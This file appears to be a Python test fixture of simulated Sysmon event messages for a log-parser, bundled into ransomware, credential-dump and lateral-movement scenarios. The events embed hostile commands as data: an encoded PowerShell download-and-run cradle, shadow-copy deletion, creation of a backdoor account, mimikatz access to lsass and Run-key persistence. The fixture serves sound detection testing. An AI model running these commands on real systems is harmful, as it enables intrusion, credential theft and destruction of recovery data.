# tests/fixtures/sysmon_messages.py
"""
Realistic Sysmon event message strings for each event ID.
These mimic the exact format that Sysmon writes to the Windows Event Log,
so the parser.py extract_field() function works against them unchanged.
"""

# ── EVENT ID 1 — Process Create ──────────────────────────────────────────

PROC_POWERSHELL_ENCODED = """
RuleName: technique_id=T1059.001,technique_name=Command and Scripting Interpreter
UtcTime: 2026-06-18 02:34:11.123
ProcessGuid: {4c5d6e7f-8a9b-0c1d-2e3f-4a5b6c7d8e9f}
ProcessId: 4892
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
FileVersion: 10.0.19041.1
Description: Windows PowerShell
CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==
CurrentDirectory: C:\\Users\\alice\\
User: HARMONYTECH\\alice
LogonGuid: {1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d}
LogonId: 0x3E7
TerminalSessionId: 1
IntegrityLevel: High
ParentProcessGuid: {9f8e7d6c-5b4a-3f2e-1d0c-9b8a7f6e5d4c}
ParentProcessId: 3124
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\\Users\\alice\\Downloads\\invoice.docm"
"""

PROC_VSSADMIN_DELETE = """
RuleName: technique_id=T1490,technique_name=Inhibit System Recovery
UtcTime: 2026-06-18 02:35:44.456
ProcessGuid: {5d6e7f80-9b0c-1d2e-3f4a-5b6c7d8e9f0a}
ProcessId: 5120
Image: C:\\Windows\\System32\\vssadmin.exe
FileVersion: 10.0.19041.1
Description: Command Line Interface for Microsoft® Volume Shadow Copy Service
CommandLine: vssadmin.exe delete shadows /all /quiet
CurrentDirectory: C:\\Windows\\system32\\
User: HARMONYTECH\\alice
LogonId: 0x3E7
IntegrityLevel: High
ParentProcessId: 4892
ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
ParentCommandLine: powershell.exe -nop -w hidden -enc SQBFAFg...
"""

PROC_CMD_FROM_WORD = """
RuleName: -
UtcTime: 2026-06-18 02:33:58.789
ProcessGuid: {3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f}
ProcessId: 4100
Image: C:\\Windows\\System32\\cmd.exe
FileVersion: 10.0.19041.1
Description: Windows Command Processor
CommandLine: cmd.exe /c whoami && net user /add backdoor P@ss2026!
CurrentDirectory: C:\\Users\\alice\\AppData\\Local\\Temp\\
User: HARMONYTECH\\alice
LogonId: 0x3E7
IntegrityLevel: High
ParentProcessId: 3124
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\\Users\\alice\\Downloads\\invoice.docm"
"""

# ── EVENT ID 3 — Network Connection ──────────────────────────────────────

NET_C2_SUSPICIOUS_PORT = """
RuleName: technique_id=T1071,technique_name=Application Layer Protocol
UtcTime: 2026-06-18 02:36:01.001
ProcessGuid: {4c5d6e7f-8a9b-0c1d-2e3f-4a5b6c7d8e9f}
ProcessId: 4892
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
User: HARMONYTECH\\alice
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.0.5
SourceHostname: AliceVm.harmonytech.local
SourcePort: 49823
DestinationIsIpv6: false
DestinationIp: 185.220.101.47
DestinationHostname: -
DestinationPort: 4444
"""

NET_EXTERNAL_EXFIL = """
RuleName: -
UtcTime: 2026-06-18 02:38:15.332
ProcessGuid: {4c5d6e7f-8a9b-0c1d-2e3f-4a5b6c7d8e9f}
ProcessId: 4892
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
User: HARMONYTECH\\alice
Protocol: tcp
Initiated: true
SourceIp: 10.0.0.5
SourcePort: 50001
DestinationIp: 203.0.113.99
DestinationHostname: -
DestinationPort: 443
"""

# ── EVENT ID 10 — Process Access (lsass) ─────────────────────────────────

LSASS_DUMP_ACCESS = """
RuleName: technique_id=T1003.001,technique_name=LSASS Memory
UtcTime: 2026-06-18 02:39:00.000
SourceProcessGUID: {6e7f8a9b-0c1d-2e3f-4a5b-6c7d8e9f0a1b}
SourceProcessId: 6200
SourceImage: C:\\Users\\alice\\AppData\\Local\\Temp\\mimikatz.exe
TargetProcessGUID: {00000000-0000-0000-0000-000000000000}
TargetProcessId: 704
TargetImage: C:\\Windows\\system32\\lsass.exe
GrantedAccess: 0x1fffff
CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll
SourceUser: HARMONYTECH\\alice
"""

# ── EVENT ID 11 — File Create ─────────────────────────────────────────────

FILE_ENCRYPTED_EXT = """
RuleName: technique_id=T1486,technique_name=Data Encrypted for Impact
UtcTime: 2026-06-18 02:40:11.222
ProcessGuid: {4c5d6e7f-8a9b-0c1d-2e3f-4a5b6c7d8e9f}
ProcessId: 4892
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
TargetFilename: C:\\Users\\alice\\Documents\\Q1_Report.docx.locked
CreationUtcTime: 2026-06-18 02:40:11.222
User: HARMONYTECH\\alice
"""

FILE_EXE_FROM_OFFICE = """
RuleName: -
UtcTime: 2026-06-18 02:33:50.100
ProcessGuid: {3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f}
ProcessId: 3124
Image: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
TargetFilename: C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe
CreationUtcTime: 2026-06-18 02:33:50.100
User: HARMONYTECH\\alice
"""

# ── EVENT ID 13 — Registry Set ────────────────────────────────────────────

REG_PERSISTENCE_RUN = """
RuleName: technique_id=T1547.001,technique_name=Registry Run Keys
UtcTime: 2026-06-18 02:37:05.555
ProcessGuid: {4c5d6e7f-8a9b-0c1d-2e3f-4a5b6c7d8e9f}
ProcessId: 4892
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate
Details: C:\\Users\\alice\\AppData\\Roaming\\svchost32.exe
User: HARMONYTECH\\alice
"""


# ── SCENARIO BUNDLES ──────────────────────────────────────────────────────
# Ready-made bundles mapping to specific attack scenarios.
# Each entry: (event_id, message_string, timestamp, machine)

TS_BASE = "2026-06-18T02:33:00Z"
MACHINE = "AliceVm.harmonytech.local"

SCENARIO_RANSOMWARE = [
    (1,  PROC_CMD_FROM_WORD,        "2026-06-18T02:33:58Z", MACHINE),
    (1,  PROC_POWERSHELL_ENCODED,   "2026-06-18T02:34:11Z", MACHINE),
    (11, FILE_EXE_FROM_OFFICE,      "2026-06-18T02:33:50Z", MACHINE),
    (3,  NET_C2_SUSPICIOUS_PORT,    "2026-06-18T02:36:01Z", MACHINE),
    (3,  NET_EXTERNAL_EXFIL,        "2026-06-18T02:38:15Z", MACHINE),
    (13, REG_PERSISTENCE_RUN,       "2026-06-18T02:37:05Z", MACHINE),
    (1,  PROC_VSSADMIN_DELETE,      "2026-06-18T02:35:44Z", MACHINE),
    (11, FILE_ENCRYPTED_EXT,        "2026-06-18T02:40:11Z", MACHINE),
]

SCENARIO_CREDENTIAL_DUMP = [
    (10, LSASS_DUMP_ACCESS,         "2026-06-18T02:39:00Z", MACHINE),
    (1,  PROC_POWERSHELL_ENCODED,   "2026-06-18T02:34:11Z", MACHINE),
    (3,  NET_C2_SUSPICIOUS_PORT,    "2026-06-18T02:36:01Z", MACHINE),
]

SCENARIO_LATERAL_MOVEMENT = [
    (1,  PROC_CMD_FROM_WORD,        "2026-06-18T02:33:58Z", MACHINE),
    (13, REG_PERSISTENCE_RUN,       "2026-06-18T02:37:05Z", MACHINE),
    (3,  NET_EXTERNAL_EXFIL,        "2026-06-18T02:38:15Z", MACHINE),
]
